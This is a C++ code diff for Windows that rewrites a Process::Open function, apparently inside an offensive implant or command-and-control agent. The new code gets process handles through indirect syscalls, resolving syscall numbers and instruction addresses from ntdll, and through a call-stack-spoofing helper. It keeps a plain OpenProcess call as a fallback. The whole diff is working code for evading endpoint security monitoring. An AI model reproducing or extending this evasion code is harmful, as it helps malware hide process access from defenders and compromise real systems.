@@ -5,20 +5,34 @@ auto DECLFN Process::Open(
     _In_ BOOL  InheritHandle,
     _In_ ULONG ProcessID
 ) -> HANDLE {
-    HANDLE Handle = nullptr;
+    const UINT32 Flags    = SYSCALL_FLAGS;
+    NTSTATUS     Status   = STATUS_UNSUCCESSFUL;
+    HANDLE       Handle   = nullptr;
+    CLIENT_ID    ClientID = { .UniqueProcess = UlongToHandle( ProcessID ) };
+    OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr) };
 
-    if ( Self->Sys->Enabled ) {
-        NTSTATUS          Status   = STATUS_UNSUCCESSFUL;
-        OBJECT_ATTRIBUTES ObjAttr  = { sizeof(OBJECT_ATTRIBUTES), NULL, nullptr, 0, NULL, NULL };
-        CLIENT_ID         ClientID = { .UniqueProcess = UlongToHandle( ProcessID ) };
-
-        SyscallExec( Sys::OpenProc, Status, &Handle, RightsAccess, &ClientID );
-        Self->Usf->NtStatusToError( Status );
-    } else {
-        KhDbg( "%d", KhGetError );
-        Handle = Self->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );
-        KhDbg( "%X %d", Handle, KhGetError );
+    if (!(Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF))) {
+        return Self->Krnl32.OpenProcess(RightsAccess, InheritHandle, ProcessID);
     }
+
+    UPTR Address = (Flags & SYSCALL_INDIRECT)
+        ? (UPTR)Self->Sys->Ext[Sys::OpenProc].Instruction
+        : (UPTR)Self->Ntdll.NtOpenProcess;
+
+    UPTR ssn = (Flags & SYSCALL_INDIRECT)
+        ? (UPTR)Self->Sys->Ext[Sys::OpenProc].ssn
+        : 0;
+
+    if (Flags & SYSCALL_INDIRECT && !(Flags & SYSCALL_SPOOF)) {
+        SyscallExec(Sys::OpenProc, Status, &Handle, RightsAccess, &ObjAttr, &ClientID);
+    } else {
+        Status = Self->Spf->Call(
+            Address, ssn, (UPTR)&Handle, (UPTR)RightsAccess,
+            (UPTR)&ObjAttr, (UPTR)&ClientID
+        );
+    }
+
+    Self->Usf->NtStatusToError(Status);
 
     return Handle;
 }
